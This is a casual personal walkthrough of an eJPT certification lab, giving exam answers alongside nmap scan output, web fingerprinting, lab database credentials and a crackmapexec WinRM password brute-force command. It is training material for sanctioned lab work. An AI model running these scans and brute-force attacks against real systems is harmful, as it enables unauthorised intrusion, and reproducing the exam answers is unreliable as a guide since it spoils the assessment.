
# 🛡️ eJPT Walkthrough – *How I Completed It in 11 Hours*

### *by Digvijay Netke (your boi speedran pentesting)*

---

# 🧨 **Introduction**

Bro, I just complete eJPT. Definitely should've taken it sooner instead of doubting my prep, but sometimes you just gotta send it.

It’s official: Your boi is a Penetration Tester! Hahaha letssss gooooooo! 🔥"

Armed with:

* Kali Linux
* Hydra
* crackmapexec
* your boy’s curiosity
* and 2.5 brain cells

…I went full hacker mode and finished everything in a single blast.

This is the **complete walkthrough** of my run — screenshots, commands, fun mistakes, everything.

Enjoy. 😎

---
so first. when i cat /etc/hosts
<img width="1899" height="183" alt="2" src="https://github.com/user-attachments/assets/99f260c4-acf7-44aa-ba3e-f93e79e71364" />
i found 
During the analysis, I observed that every host in the network was communicating with 192.168.100.5. Suspecting this to be a central server or pivot point, I decided to map out the rest of the network.

I initiated a comprehensive Nmap scan on the entire subnet (192.168.100.0/24) to identify all active hosts, open ports, and running services:

```
nmap -p- -sV -sC -Pn -O 192.168.100.0/24 -T4 -oN ports.txt
```
### result
````
# Nmap 7.92 scan initiated Mon Dec  1 13:50:31 2025 as: nmap -p- -sV -sC -Pn -O -T4 -oN ports.txt 192.168.100.0/24
Nmap scan report for ip-192-168-100-1.ap-south-1.compute.internal (192.168.100.1)
Host is up (0.00018s latency).
All 65535 scanned ports on ip-192-168-100-1.ap-south-1.compute.internal (192.168.100.1) are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 02:9B:F4:B9:8A:CB (Unknown)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

Nmap scan report for ip-192-168-100-50.ap-south-1.compute.internal (192.168.100.50)
Host is up (0.00038s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-title: WAMPSERVER Homepage
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
3307/tcp  open  opsession-prxy?
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-192-168-100-5.ap-south-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-12-01T08:36:48+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-01
|   NetBIOS_Domain_Name: WINSERVER-01
|   NetBIOS_Computer_Name: WINSERVER-01
|   DNS_Domain_Name: WINSERVER-01
|   DNS_Computer_Name: WINSERVER-01
|   Product_Version: 6.3.9600
|_  System_Time: 2025-12-01T08:36:43+00:00
| ssl-cert: Subject: commonName=WINSERVER-01
| Not valid before: 2025-11-30T08:07:52
|_Not valid after:  2026-06-01T08:07:52
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49179/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3307-TCP:V=7.92%I=7%D=12/1%Time=692D5348%P=x86_64-pc-linux-gnu%r(NU
SF:LL,6B,"g\0\0\x01\xffj\x04Host\x20'ip-192-168-100-5\.ap-south-1\.compute
SF:\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20M
SF:ariaDB\x20server");
MAC Address: 02:83:09:DE:D6:5D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/1%OT=80%CT=1%CU=35712%PV=Y%DS=1%DC=D%G=Y%M=028309%T
OS:M=692D53A0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I
OS:%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301
OS:NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000
OS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
OS:%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WINSERVER-01, NetBIOS user: <unknown>, NetBIOS MAC: 02:83:09:de:d6:5d (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-12-01T08:36:41
|_  start_date: 2025-12-01T08:07:49
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WINSERVER-01
|   NetBIOS computer name: WINSERVER-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-01T08:36:38+00:00

Nmap scan report for ip-192-168-100-51.ap-south-1.compute.internal (192.168.100.51)
Host is up (0.00049s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-19-22  02:25AM       <DIR>          aspnet_client
| 04-19-22  01:19AM                 1400 cmdasp.aspx
| 04-19-22  12:17AM                99710 iis-85.png
| 04-19-22  12:17AM                  701 iisstart.htm
|_04-19-22  02:13AM                   22 robots.txt.txt
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/8.5
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Mon, 01 Dec 2025 08:36:42 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Directory Listing: 
|     http://ip-192-168-100-51.ap-south-1.compute.internal/
|     http://ip-192-168-100-51.ap-south-1.compute.internal/aspnet_client/
|     http://ip-192-168-100-51.ap-south-1.compute.internal/cmdasp.aspx
|     http://ip-192-168-100-51.ap-south-1.compute.internal/iis-85.png
|     http://ip-192-168-100-51.ap-south-1.compute.internal/iisstart.htm
|_    http://ip-192-168-100-51.ap-south-1.compute.internal/robots.txt.txt
|_http-svn-info: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-12-01T08:36:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINSERVER-02
| Not valid before: 2025-11-30T08:07:38
|_Not valid after:  2026-06-01T08:07:38
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-02
|   NetBIOS_Domain_Name: WINSERVER-02
|   NetBIOS_Computer_Name: WINSERVER-02
|   DNS_Domain_Name: WINSERVER-02
|   DNS_Computer_Name: WINSERVER-02
|   Product_Version: 6.3.9600
|_  System_Time: 2025-12-01T08:36:42+00:00
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49174/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:18:17:A4:09:3D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/1%OT=21%CT=1%CU=31915%PV=Y%DS=1%DC=D%G=Y%M=021817%T
OS:M=692D53A0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I
OS:%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301
OS:NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000
OS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
OS:%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-01T08:36:39
|_  start_date: 2025-12-01T08:07:29
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: WINSERVER-02, NetBIOS user: <unknown>, NetBIOS MAC: 02:18:17:a4:09:3d (unknown)

Nmap scan report for ip-192-168-100-52.ap-south-1.compute.internal (192.168.100.52)
Host is up (0.00068s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 41:d6:40:0e:70:bd:f8:fc:7c:6d:21:ca:bc:2c:5b:b4 (RSA)
|   256 9b:56:b6:e1:1d:17:ec:a4:30:a1:a7:4f:58:47:96:6a (ECDSA)
|_  256 5f:af:48:97:16:0d:e2:cd:b1:1e:c3:fc:bc:f4:8b:29 (ED25519)
80/tcp   open  http          Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-02-21 17:28  drupal/ (7.57)
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 4.13.17-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 37
|   Capabilities flags: 63486
|   Some Capabilities: DontAllowDatabaseTableColumn, LongColumnFlag, ODBCClient, IgnoreSigpipes, SupportsCompression, SupportsLoadDataLocal, Speaks41ProtocolOld, InteractiveClient, SupportsTransactions, Speaks41ProtocolNew, Support41Auth, FoundRows, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: .x6@!~|rGJ|VvrW;aYzz
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server xrdp
MAC Address: 02:83:D5:B5:C1:47 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/1%OT=21%CT=1%CU=35912%PV=Y%DS=1%DC=D%G=Y%M=0283D5%T
OS:M=692D53A0%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=101%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)
Network Distance: 1 hop
Service Info: Host: IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
| smb2-time: 
|   date: 2025-12-01T08:36:40
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: IP-192-168-100-, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 0s, deviation: 2s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.13.17-Ubuntu)
|   Computer name: ip-192-168-100-52
|   NetBIOS computer name: IP-192-168-100-52\x00
|   Domain name: ap-south-1.compute.internal
|   FQDN: ip-192-168-100-52.ap-south-1.compute.internal
|_  System time: 2025-12-01T08:36:41+00:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap scan report for ip-192-168-100-55.ap-south-1.compute.internal (192.168.100.55)
Host is up (0.00045s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-01T08:36:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINSERVER-03
| Not valid before: 2025-11-30T08:07:11
|_Not valid after:  2026-06-01T08:07:11
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-03
|   NetBIOS_Domain_Name: WINSERVER-03
|   NetBIOS_Computer_Name: WINSERVER-03
|   DNS_Domain_Name: WINSERVER-03
|   DNS_Computer_Name: WINSERVER-03
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-01T08:36:39+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:61:0F:BC:3A:F1 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/1%OT=80%CT=1%CU=31123%PV=Y%DS=1%DC=D%G=Y%M=02610F%T
OS:M=692D53A0%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=103%TI=I%CI=I%II=I%
OS:SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%O
OS:5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
OS:=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O
OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80
OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
OS:%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-01T08:36:41
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: WINSERVER-03
|   NetBIOS computer name: WINSERVER-03\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-01T08:36:40+00:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WINSERVER-03, NetBIOS user: <unknown>, NetBIOS MAC: 02:61:0f:bc:3a:f1 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap scan report for ip-192-168-100-63.ap-south-1.compute.internal (192.168.100.63)
Host is up (0.00035s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-IK4QFED
|   NetBIOS_Domain_Name: EC2AMAZ-IK4QFED
|   NetBIOS_Computer_Name: EC2AMAZ-IK4QFED
|   DNS_Domain_Name: EC2AMAZ-IK4QFED
|   DNS_Computer_Name: EC2AMAZ-IK4QFED
|   Product_Version: 10.0.14393
|_  System_Time: 2025-12-01T08:36:38+00:00
|_ssl-date: 2025-12-01T08:36:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=EC2AMAZ-IK4QFED
| Not valid before: 2025-11-30T08:06:12
|_Not valid after:  2026-06-01T08:06:12
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 02:C0:57:F2:BE:D7 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 6.X (85%)
OS CPE: cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


Nmap scan report for ip-192-168-100-67.ap-south-1.compute.internal (192.168.100.67)
Host is up (0.00038s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 22:8e:9b:4a:8d:6f:80:3d:34:f9:06:6d:d4:44:f6:ff (RSA)
|   256 3d:9b:21:d2:92:43:b3:da:1d:cf:5f:db:87:6c:60:52 (ECDSA)
|_  256 44:0a:56:08:36:e0:9c:d8:87:ac:98:2c:65:f1:a8:fd (ED25519)
MAC Address: 02:3E:F1:6B:9E:B3 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/1%OT=22%CT=1%CU=43021%PV=Y%DS=1%DC=D%G=Y%M=023EF1%T
OS:M=692D53A0%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=2%ISR=10F%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M2301ST11NW6%O2=M2301ST11NW6%O3=M2301NNT11NW6%O4=M2301ST11NW
OS:6%O5=M2301ST11NW6%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4
OS:B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=
OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for ip-192-168-100-5.ap-south-1.compute.internal (192.168.100.5)
Host is up (0.000027s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.7p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:b9:f6:2b:29:49:a8:9e:ef:a5:f6:2a:3d:51:7a:11 (RSA)
|   256 63:aa:4b:49:5b:77:23:31:29:55:5c:2b:bb:df:60:a1 (ECDSA)
|_  256 c7:71:68:04:c8:62:92:79:9c:ef:69:50:b1:f9:51:b8 (ED25519)
3389/tcp  open  ms-wbt-server xrdp
5910/tcp  open  vnc           VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VeNCrypt (19)
|     VNC Authentication (2)
|   VeNCrypt auth subtypes: 
|     VNC auth, Anonymous TLS (258)
|_    Unknown security type (2)
45656/tcp open  http          Werkzeug httpd 2.0.2 (Python 3.9.8)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/2.0.2 Python/3.9.8
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Post-scan script results:
| clock-skew: 
|   0s: 
|     192.168.100.52 (ip-192-168-100-52.ap-south-1.compute.internal)
|     192.168.100.63 (ip-192-168-100-63.ap-south-1.compute.internal)
|     192.168.100.51 (ip-192-168-100-51.ap-south-1.compute.internal)
|     192.168.100.55 (ip-192-168-100-55.ap-south-1.compute.internal)
|_    192.168.100.50 (ip-192-168-100-50.ap-south-1.compute.internal)
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec  1 14:07:12 2025 -- 256 IP addresses (8 hosts up) scanned in 1000.68 seconds
````
Now that we have complete information about the network (or at least, so I thought at the time), let's get started and solve the questions.
## **Q1.What is the IP address of the host running SAMBA?**
192.168.100.52

why becasue only linux system running have this samba runing(from nmap result)


## **Q2. What is the IP address of the host running WordPress?**
So, how did I find it?

First, I thought running whatweb would be the best approach, since I noticed that only 4 of the hosts had HTTP services running...
<img width="1899" height="183" alt="2" src="https://github.com/user-attachments/assets/8f06e16f-2f7a-4864-b89b-09cbc7df8902" />

I started by fingerprinting the four web servers using whatweb to identify the technologies in use:

Bash

root@kali:~# whatweb http://192.168.100.50/
# [Output shows Apache/2.4.51 (Win64) PHP/7.4.26, WAMPSERVER]
root@kali:~# whatweb http://192.168.100.51

[Output shows Microsoft-IIS/8.5]
root@kali:~# whatweb http://192.168.100.52

[Output shows Apache (Ubuntu), Index of /]
root@kali:~# whatweb http://192.168.100.55

[Output shows Microsoft-IIS/10.0]

**Analysis:**
The initial scan didn't reveal the specific CMS I was looking for. I manually checked for a `/wordpress` directory on the hosts. Although the directory seemed present, I couldn't immediately find the entry point.

To dig deeper, I ran dirb against the WAMPSERVER host (192.168.100.50) and successfully discovered the login page:

```
found: http://192.168.100.50/wordpress/wp-login.php
```
verifying this with whatweb confirmed that WordPress is running on this host:

```

root@kali:~# whatweb http://192.168.100.50/wordpress/wp-login.php
...
Title[Log In < Syntex - WordPress], PoweredBy[WordPress]
```
Conclusion: The target running WordPress is 192.168.100.50

## **Q3. How many hosts on the DMZ network are running a database server?**
I was initially confused because I saw database services running on two different hosts.

Host 192.168.100.52 was running a standard MySQL service on port 3306. However, Host 192.168.100.50 had an open port on 3307, which Nmap oddly identified as opsession-prxy?.

I decided to grab the banner manually to verify the service on .50:



>nc 192.168.100.50 3307
The server responded with: 'Host... is not allowed to connect to this MariaDB server.'

This confirmed that while a database exists on .50 (likely for the WordPress site), it is firewall-restricted against external connections. This eliminated it as a direct attack vector.

<img width="806" height="238" alt="3" src="https://github.com/user-attachments/assets/b051cdc1-e5e7-4588-a095-2f0f5f98fcb5" />

## **Q4. What version of MySQL is running on the system hosting a Drupal site?**

After obtaining potential database credentials (I will cover the discovery process in a later section), I proceeded to verify them against the MySQL service.
```
Credentials Found:
Database: drupal
Username: drupal
Password: syntex0421
```
I used the mysql_login module in msfconsole to test these credentials. The login was successful, and the module returned the banner:

Bash

[+] ... Success: 'drupal:syntex0421'
[*] MySQL version: 5.5.5
This confirmed two things:

The credentials are valid for remote access.

The server version matches the earlier Nmap enumeration, confirming the target environment.

## **Q5. What version of Windows is running on the host running WordPress?**

With port 5985 (WinRM) exposed, I attempted a brute-force attack to identify valid credentials. I utilized crackmapexec paired with standard Metasploit wordlists.

Command:

Bash
```
crackmapexec winrm 192.168.100.50 -u /usr/share/wordlists/metasploit/unix_users.txt -p /usr/share/wordlists/metasploit/unix_passwords.txt
```
Result: The attack was successful (Pwn3d!), revealing a valid username and password combination

<img width="956" height="286" alt="4" src="https://github.com/user-attachments/assets/bb79d136-ee1d-43a8-8fc7-c90c9fc9f843" />
